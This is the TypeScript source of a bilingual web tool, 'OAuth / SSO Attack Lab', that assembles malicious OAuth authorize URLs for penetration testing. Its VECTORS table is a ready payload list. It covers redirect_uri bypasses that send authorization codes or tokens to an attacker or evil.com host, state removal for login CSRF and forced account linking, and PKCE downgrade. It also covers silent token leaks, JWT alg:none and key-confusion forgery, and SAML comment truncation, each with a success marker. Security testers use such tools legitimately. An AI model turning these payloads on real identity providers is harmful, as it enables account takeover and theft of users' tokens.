import { h, clear } from '../lib/dom';
import { copyButton } from '../lib/copy';
import { substTarget, getToken, setToken, onTargetChange } from '../lib/target';
import { t, getLang } from '../lib/i18n';
import { ScrollTop } from '../components/scrolltop';

// OAuth / SSO Attack Lab — an OFFLINE crafter. Assembles a malicious /authorize URL you copy into a
// browser or Burp; the app never fires. Vectors that mutate the URL have an "Apply" toggle that
// actually rewrites the assembled URL; the rest carry a ready payload + the success marker.

interface Overrides { redirect: string; omitState: boolean; omitPkce: boolean; pkceMethod: string; responseType: string; extra: string[]; }

// Bilingual string: the flow notes and vector prose carry both locales and are resolved by getLang()
// at view-build time (switching language does a full reload, so a one-shot resolve is correct).
type LS = { ru: string; en: string };

interface Flow { id: string; name: string; rt: string; pkce?: boolean; note: LS; }
const FLOWS: Flow[] = [
  { id: 'code', name: 'Authorization Code', rt: 'code', note: { ru: 'самый частый; крадём code и меняем на токен на /token', en: 'the most common; steal the code and swap it for a token at /token' } },
  { id: 'pkce', name: 'Code + PKCE', rt: 'code', pkce: true, note: { ru: 'public-клиенты (SPA/мобайл); проверяем downgrade PKCE', en: 'public clients (SPA / mobile); test for a PKCE downgrade' } },
  { id: 'implicit', name: 'Implicit', rt: 'token', note: { ru: 'access_token прилетает прямо в #fragment', en: 'access_token comes straight back in the #fragment' } },
  { id: 'hybrid', name: 'Hybrid', rt: 'code id_token', note: { ru: 'code и id_token сразу; больше каналов утечки', en: 'code and id_token at once; more leak channels' } },
];

interface Vec { id: string; name: LS; payload: LS; desc?: LS; success?: LS; apply?: (ov: Overrides) => void; }
interface VecGroup { group: LS; items: Vec[]; }
const VECTORS: VecGroup[] = [
  { group: { ru: 'redirect_uri: обход валидации', en: 'redirect_uri: validation bypass' }, items: [
    { id: 'rt-trav', name: { ru: 'Path traversal', en: 'Path traversal' }, payload: { ru: '{REDIRECT_URI}/../../redirect?url=https://{COLLAB}', en: '{REDIRECT_URI}/../../redirect?url=https://{COLLAB}' }, desc: { ru: 'AS матчит префикс/подстроку, а не точную строку', en: 'the AS matches a prefix / substring, not the exact string' }, success: { ru: 'code или token уходит на твой хост', en: 'code or token is sent to your host' }, apply: (ov) => { ov.redirect = '{REDIRECT_URI}/../../redirect?url=https://{COLLAB}'; } },
    { id: 'rt-sub', name: { ru: 'Поддомен / @ / точка', en: 'Subdomain / @ / dot' }, payload: { ru: 'https://{REDIRECT_URI}.evil.com/cb   |   https://{REDIRECT_URI}@evil.com   |   https://evil.{REDIRECT_URI}/cb', en: 'https://{REDIRECT_URI}.evil.com/cb   |   https://{REDIRECT_URI}@evil.com   |   https://evil.{REDIRECT_URI}/cb' }, desc: { ru: 'обход по части хоста', en: 'bypass via part of the host' }, apply: (ov) => { ov.redirect = 'https://{REDIRECT_URI}@{COLLAB}/cb'; } },
    { id: 'rt-enc', name: { ru: 'Кодирование слэша', en: 'Slash encoding' }, payload: { ru: '%2f   %252f   %5c   /./   ;%2e%2e   #', en: '%2f   %252f   %5c   /./   ;%2e%2e   #' }, desc: { ru: 'одинарное/двойное кодирование пути и обрезка хвоста', en: 'single / double path encoding and tail truncation' } },
    { id: 'rt-open', name: { ru: 'Open redirect на разрешённом хосте (Dirty Dancing)', en: 'Open redirect on an allowed host (Dirty Dancing)' }, payload: { ru: '{REDIRECT_URI}/out?next=https://{COLLAB}', en: '{REDIRECT_URI}/out?next=https://{COLLAB}' }, desc: { ru: 'разрешённый хост сам редиректит ответ к тебе', en: 'the allowed host itself redirects the response to you' }, success: { ru: 'code в query или token в #fragment на {COLLAB}', en: 'code in the query or token in the #fragment on {COLLAB}' }, apply: (ov) => { ov.redirect = '{REDIRECT_URI}/out?next=https://{COLLAB}'; } },
  ] },
  { group: { ru: 'state / CSRF / привязка', en: 'state / CSRF / binding' }, items: [
    { id: 'st-omit', name: { ru: 'Убрать state', en: 'Drop state' }, payload: { ru: '(state удаляется из authorize URL)', en: '(state is removed from the authorize URL)' }, desc: { ru: 'forced account linking / login CSRF', en: 'forced account linking / login CSRF' }, success: { ru: 'callback логинит/привязывает без проверки', en: 'the callback logs in / links with no check' }, apply: (ov) => { ov.omitState = true; } },
    { id: 'st-static', name: { ru: 'Статичный или переиспользуемый state', en: 'Static or reusable state' }, payload: { ru: 'state=fixed123  (повтори тот же)', en: 'state=fixed123  (reuse the same one)' }, desc: { ru: 'не привязан к сессии, предсказуем', en: 'not bound to the session, predictable' } },
    { id: 'st-force', name: { ru: 'Forced linking', en: 'Forced linking' }, payload: { ru: 'авто-сабмит {REDIRECT_URI}?code=ATTACKER_CODE  в сессию жертвы', en: 'auto-submit {REDIRECT_URI}?code=ATTACKER_CODE  into the victim session' }, desc: { ru: 'свой неиспользованный code в callback жертвы', en: 'your unused code in the victim callback' }, success: { ru: 'к аккаунту жертвы привязана твоя соц-личность', en: 'your social identity gets linked to the victim account' } },
  ] },
  { group: { ru: 'PKCE downgrade', en: 'PKCE downgrade' }, items: [
    { id: 'pk-strip', name: { ru: 'Снять code_challenge', en: 'Strip code_challenge' }, payload: { ru: '(code_challenge и method удаляются)', en: '(code_challenge and method are removed)' }, desc: { ru: 'AS требует PKCE только если challenge присутствует', en: 'the AS enforces PKCE only when a challenge is present' }, success: { ru: '/token принимает code без code_verifier', en: '/token accepts the code with no code_verifier' }, apply: (ov) => { ov.omitPkce = true; } },
    { id: 'pk-plain', name: { ru: 'S256 → plain', en: 'S256 → plain' }, payload: { ru: 'code_challenge_method=plain', en: 'code_challenge_method=plain' }, desc: { ru: 'если plain всё ещё принимается', en: 'if plain is still accepted' }, apply: (ov) => { ov.pkceMethod = 'plain'; } },
  ] },
  { group: { ru: 'утечка code / token', en: 'code / token leak' }, items: [
    { id: 'lk-impl', name: { ru: 'Свитч на implicit', en: 'Switch to implicit' }, payload: { ru: 'response_type=token id_token', en: 'response_type=token id_token' }, desc: { ru: 'если AS разрешает сменить response_type', en: 'if the AS lets you change the response_type' }, success: { ru: 'токен в #fragment, читается opener/postMessage/Referer', en: 'token in the #fragment, read via opener / postMessage / Referer' }, apply: (ov) => { ov.responseType = 'token id_token'; } },
    { id: 'lk-mode', name: { ru: 'response_mode', en: 'response_mode' }, payload: { ru: 'response_mode=form_post   |   fragment   |   query', en: 'response_mode=form_post   |   fragment   |   query' }, desc: { ru: 'куда именно прилетит ответ', en: 'where exactly the response lands' }, apply: (ov) => { ov.extra.push('response_mode=form_post'); } },
    { id: 'lk-prompt', name: { ru: 'prompt=none (silent auth)', en: 'prompt=none (silent auth)' }, payload: { ru: '&prompt=none', en: '&prompt=none' }, desc: { ru: 'тихий повторный выпуск без экрана согласия', en: 'silent re-issue with no consent screen' }, success: { ru: 'токен выдаётся без взаимодействия жертвы', en: 'token is issued with no victim interaction' }, apply: (ov) => { ov.extra.push('prompt=none'); } },
    { id: 'lk-ref', name: { ru: 'Referer / opener leak', en: 'Referer / opener leak' }, payload: { ru: 'callback с 3rd-party JS  ->  Referer: ...#access_token=', en: 'callback with 3rd-party JS  ->  Referer: ...#access_token=' }, desc: { ru: 'фрагмент утекает через Referer или window.opener', en: 'the fragment leaks via Referer or window.opener' } },
  ] },
  { group: { ru: 'личность / ATO', en: 'identity / ATO' }, items: [
    { id: 'id-noauth', name: { ru: 'nOAuth (мутабельный email-клейм)', en: 'nOAuth (mutable email claim)' }, payload: { ru: 'в своём IdP-тенанте: email = {USER_B}, затем Sign in with Microsoft', en: 'in your own IdP tenant: email = {USER_B}, then Sign in with Microsoft' }, desc: { ru: 'RP матчит по email, а не по sub+iss / oid+tid', en: 'the RP matches on email, not on sub+iss / oid+tid' }, success: { ru: 'входишь как жертва без фишинга и кражи токена', en: 'sign in as the victim with no phishing or token theft' } },
    { id: 'id-pass', name: { ru: 'Pass-the-token (нет проверки aud)', en: 'Pass-the-token (no aud check)' }, payload: { ru: 'подставь свой access_token в /auth/social жертвы', en: 'submit your access_token to the victim /auth/social' }, desc: { ru: 'RP не проверяет aud/azp == свой client_id', en: 'the RP never checks aud / azp == its own client_id' } },
    { id: 'id-jwt', name: { ru: 'id_token: alg:none / RS256→HS256', en: 'id_token: alg:none / RS256→HS256' }, payload: { ru: 'jwt_tool <id_token> -X a    |    jwt_tool <id_token> -X k -pk jwks_pub.pem', en: 'jwt_tool <id_token> -X a    |    jwt_tool <id_token> -X k -pk jwks_pub.pem' }, desc: { ru: 'confusion подписи, role/email под контролем', en: 'signature confusion, role / email under your control' }, success: { ru: 'форж id_token принимается RP', en: 'the forged id_token is accepted by the RP' } },
    { id: 'id-saml', name: { ru: 'SAML comment truncation / XSW', en: 'SAML comment truncation / XSW' }, payload: { ru: '<NameID>{USER_B}<!---->.attacker.com</NameID>   (или SAML Raider XSW)', en: '<NameID>{USER_B}<!---->.attacker.com</NameID>   (or SAML Raider XSW)' }, desc: { ru: 'парсер берёт текст до комментария, подпись валидна', en: 'the parser takes the text before the comment, the signature stays valid' }, success: { ru: 'вход как {USER_B} с подписанным ответом', en: 'sign in as {USER_B} with a signed response' } },
  ] },
];

const LS_ = (k: string) => 'oauthlab.' + k;
const rd = (k: string, d = '') => { try { return localStorage.getItem(LS_(k)) ?? d; } catch { return d; } };
const wr = (k: string, v: string) => { try { localStorage.setItem(LS_(k), v); } catch { /* ignore */ } };

export function OAuthLabView(outlet: HTMLElement): () => void {
  clear(outlet);

  const lang = getLang();
  const L = (s: LS): string => s[lang]; // resolve a bilingual string for the current language

  const state = {
    flow: rd('flow', 'code'),
    authz: rd('authz', 'https://idp.{TARGET}/authorize'),
    client: rd('client') || getToken('CLIENT_ID') || '{CLIENT_ID}',
    redirect: rd('redirect') || getToken('REDIRECT_URI') || '{REDIRECT_URI}',
    scope: rd('scope', 'openid email profile'),
    csrf: rd('csrf', 'xyz123'),
  };
  const applied = new Set<string>();
  const vecById: Record<string, Vec> = {};
  for (const g of VECTORS) for (const v of g.items) vecById[v.id] = v;
  const applyBtns: { id: string; btn: HTMLElement }[] = [];

  const urlCode = h('code', { class: 'oauth-url-code' });

  function flow(): Flow { return FLOWS.find((f) => f.id === state.flow) ?? FLOWS[0]!; }

  function buildOverrides(): Overrides {
    const ov: Overrides = { redirect: '', omitState: false, omitPkce: false, pkceMethod: '', responseType: '', extra: [] };
    for (const id of applied) vecById[id]?.apply?.(ov);
    return ov;
  }
  function rawUrl(): string {
    const f = flow(); const ov = buildOverrides();
    const rt = ov.responseType || f.rt;
    const p: string[] = [
      'response_type=' + encodeURIComponent(rt),
      'client_id=' + state.client,
      'redirect_uri=' + (ov.redirect || state.redirect),
      'scope=' + encodeURIComponent(state.scope),
    ];
    if (!ov.omitState) p.push('state=' + state.csrf);
    if (rt.includes('token')) p.push('nonce=n0nce');
    if (f.pkce && !ov.omitPkce) { p.push('code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'); p.push('code_challenge_method=' + (ov.pkceMethod || 'S256')); }
    for (const e of ov.extra) p.push(e);
    return state.authz + '?' + p.join('&');
  }
  function renderUrl() {
    const sub = substTarget(rawUrl());
    urlCode.textContent = sub.out;
    urlCode.classList.toggle('tgt', sub.changed);
  }
  function refreshApply() {
    for (const { id, btn } of applyBtns) {
      const on = applied.has(id);
      btn.classList.toggle('on', on);
      btn.textContent = on ? t('oauth.applied') : t('oauth.apply');
    }
  }
  function toggleApply(id: string) {
    if (applied.has(id)) applied.delete(id); else applied.add(id);
    renderUrl(); refreshApply();
  }

  // ---- 1. flow selector ----
  const flowRow = h('div', { class: 'oauth-flows' });
  for (const f of FLOWS) {
    const btn = h('button', { class: 'mode-btn' + (f.id === state.flow ? ' on' : ''), type: 'button', title: L(f.note),
      onclick: () => { state.flow = f.id; wr('flow', f.id); applied.clear(); flowRow.querySelectorAll('.mode-btn').forEach((b) => b.classList.remove('on')); btn.classList.add('on'); flowNote.textContent = L(f.note); renderUrl(); refreshApply(); } }, f.name);
    flowRow.appendChild(btn);
  }
  const flowNote = h('div', { class: 'oauth-flow-note' }, L(flow().note));

  // ---- 2. param inputs (client_id/redirect_uri also feed the shared context tokens) ----
  const fields: [keyof typeof state, string, string][] = [
    ['authz', t('oauth.authz'), 'https://idp.example.com/authorize'],
    ['client', 'client_id', '{CLIENT_ID}'],
    ['redirect', 'redirect_uri', '{REDIRECT_URI}'],
    ['scope', 'scope', 'openid email'],
    ['csrf', 'state', 'xyz123'],
  ];
  const form = h('div', { class: 'oauth-form' });
  for (const [key, label, ph] of fields) {
    const inp = h('input', { class: 'oauth-inp', value: state[key], placeholder: ph, spellcheck: 'false' }) as HTMLInputElement;
    inp.addEventListener('input', () => {
      state[key] = inp.value; wr(key, inp.value);
      if (key === 'client') setToken('CLIENT_ID', inp.value);
      if (key === 'redirect') setToken('REDIRECT_URI', inp.value);
      renderUrl();
    });
    form.appendChild(h('label', { class: 'oauth-field' }, h('span', { class: 'oauth-flabel' }, label), inp));
  }

  // ---- assembled URL ----
  const copyUrl = copyButton(() => substTarget(rawUrl()).out, t('oauth.copy'));
  copyUrl.classList.add('oauth-url-copy');
  const resetBtn = h('button', { class: 'oauth-reset', type: 'button', onclick: () => { applied.clear(); renderUrl(); refreshApply(); } }, t('oauth.resetUrl'));
  const urlWrap = h('div', { class: 'oauth-url' }, urlCode, copyUrl);

  // ---- context inputs for {COLLAB} / {USER_B} (used by vectors) ----
  const collabInp = h('input', { class: 'oauth-ctx-inp', value: getToken('COLLAB'), placeholder: 'abc.oast.pro', spellcheck: 'false' }) as HTMLInputElement;
  collabInp.addEventListener('input', () => { setToken('COLLAB', collabInp.value); renderUrl(); });
  const userBInp = h('input', { class: 'oauth-ctx-inp', value: getToken('USER_B'), placeholder: 'victim@target.com', spellcheck: 'false' }) as HTMLInputElement;
  userBInp.addEventListener('input', () => setToken('USER_B', userBInp.value));
  const ctxRow = h('div', { class: 'oauth-ctx' },
    h('label', { class: 'oauth-ctx-field' }, h('span', {}, '{COLLAB}'), collabInp),
    h('label', { class: 'oauth-ctx-field' }, h('span', {}, '{USER_B}'), userBInp));

  // ---- attack vectors ----
  const vecWrap = h('div', { class: 'oauth-vectors' });
  for (const g of VECTORS) {
    const groupBody = h('div', { class: 'oauth-vgroup-body' });
    for (const v of g.items) {
      const sub = substTarget(L(v.payload));
      const actions = h('div', { class: 'oauth-vec-actions' });
      if (v.apply) {
        const ab = h('button', { class: 'oauth-apply', type: 'button', onclick: () => toggleApply(v.id) }, t('oauth.apply'));
        applyBtns.push({ id: v.id, btn: ab });
        actions.appendChild(ab);
      }
      const cp = copyButton(() => substTarget(L(v.payload)).out, t('oauth.copy'));
      cp.classList.add('oauth-vec-copy2');
      actions.appendChild(cp);
      const card = h('div', { class: 'oauth-vec' },
        h('div', { class: 'oauth-vec-head' }, h('span', { class: 'oauth-vec-name' }, L(v.name)), actions),
        v.desc ? h('div', { class: 'oauth-vec-desc' }, L(v.desc)) : null,
        h('code', { class: 'oauth-vec-code' + (sub.changed ? ' tgt' : '') }, sub.out),
        v.success ? h('div', { class: 'oauth-vec-ok' }, h('b', {}, t('oauth.success')), ' ', L(v.success)) : null);
      groupBody.appendChild(card);
    }
    vecWrap.appendChild(h('div', { class: 'oauth-vgroup' }, h('div', { class: 'oauth-vgroup-h' }, L(g.group)), groupBody));
  }

  const content = h('div', { class: 'content oauth-lab' },
    h('h1', { class: 'cat-h' }, 'OAuth / SSO Lab'),
    h('div', { class: 'script-intro' }, t('oauth.howto')),
    h('div', { class: 'oauth-section-h' }, t('oauth.step1')), flowRow, flowNote,
    h('div', { class: 'oauth-section-h' }, t('oauth.step2')), form, ctxRow,
    h('div', { class: 'oauth-section-h oauth-url-h' }, h('span', {}, t('oauth.step3')), resetBtn), urlWrap,
    h('div', { class: 'oauth-url-hint' }, t('oauth.urlHint')),
    h('div', { class: 'oauth-section-h' }, t('oauth.step4')), vecWrap);
  outlet.appendChild(content);
  const scrollTop = ScrollTop();
  outlet.appendChild(scrollTop.el);

  const off = onTargetChange(() => renderUrl());
  renderUrl();
  return () => { off(); scrollTop.destroy(); };
}
